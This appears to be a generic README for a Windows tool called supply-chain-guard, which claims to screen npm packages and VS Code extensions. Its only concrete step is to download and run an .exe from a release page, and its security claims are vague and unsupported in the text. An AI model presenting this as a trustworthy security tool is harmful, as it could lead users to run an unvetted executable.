# 🛡️ supply-chain-guard - Secure your software supply chain today

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases)

supply-chain-guard protects your computer when you install new software components. It acts as a shield between the internet and your development tools. It inspects npm packages and Visual Studio Code extensions before they reach your system. This tool prevents malicious code from entering your local supply chain. It provides review support for Socket, Codex, and PI security protocols.

## 📥 Getting Started

Follow these steps to install the software on your Windows computer.

1. Go to the [official release page](https://github.com/Graceless-apeldoorn591/supply-chain-guard/releases).
2. Look for the Assets section at the bottom of the latest release.
3. Select the file ending in .exe to download the installer.
4. Open the downloaded file to begin the setup.
5. Follow the prompts on your screen.

## ⚙️ System Requirements

- Windows 10 or Windows 11.
- Node.js installed on your machine.
- Visual Studio Code installed if you plan to monitor extensions.
- At least 200MB of free disk space.
- A stable internet connection for security updates.

## 🔍 How it Works

The application monitors your installation requests. When you trigger an npm install or add a new VS Code extension, supply-chain-guard intercepts the request. It scans the package manifest and the code structure for known risks. 

It checks the package against the Socket database to ensure the code is safe. It uses the Codex review engine to analyze the logic for hidden threats. It also validates the package against PI security standards to verify origin and integrity. If the tool detects a threat, it stops the installation and alerts you with a report. You then decide whether to approve or block the installation.

## 🛠️ Configuration

The tool includes a dashboard that manages your preferences. You can access this dashboard from your system tray. 

- **Security Level:** Choose between strict, balanced, or permissive modes. Strict mode blocks all unverified packages. Balanced mode allows trusted sources.
- **Log Location:** Define where the software saves your activity history.
- **Auto-Update:** Enable this to ensure the tool receives the latest security definitions.
- **Socket Integration:** Enter your API key if you have a premium Socket account for deeper analysis.

## 🚀 Daily Usage

You do not need to do anything special to use the tool once you install it. It runs in the background. When you run a command in your terminal like npm install or add an extension in VS Code, the guard activates. 

A small window will appear if it finds a suspicious item. You will see a list of reasons why the software flagged the item. Each flag includes a severity score. Red flags indicate high risk. Yellow flags indicate moderate concern. Green flags show verified safe components. 

You can review the details or cancel the installation with one click. The software keeps a record of these events in the History tab. You can export these logs if you need to share them with a system administrator.

## 💡 Best Practices

Avoid installing packages from unknown authors. Check the weekly download count of an npm package before you add it to your project. Use supply-chain-guard to confirm that the package maintainers use secure signing practices. 

If you see multiple warnings for a single package, check the project website. Often, legitimate tools trigger warnings because they use unusual file structures. Contact the maintainer if you have doubts about a flag.

## 🛠️ Troubleshooting

If the software fails to launch, ensure you installed the latest version of Node.js. Check that your Windows firewall allows the application to access the network. 

If the tool does not appear to scan your installations, verify the path settings in the dashboard. Ensure the tool points to the correct folder where your VS Code extensions reside. 

Delete the local database cache if you experience slow performance. The tool will rebuild the database the next time you open the application. Contact support if you encounter persistent errors during installation.

## 🔒 Privacy Notice

The application processes data locally on your machine. It sends checksums of packages to our security providers to verify safety. It does not send your personal files or source code to external servers. Your security logs remain on your disk at all times.

## 📈 Supported Features

- npm registry scanning
- VS Code extension validation
- Real-time threat detection
- Socket integration for deep analysis
- Codex logic review
- PI security protocol support
- Local dashboard for preference management
- Background protection service
- Detailed security reports
- Exportable action history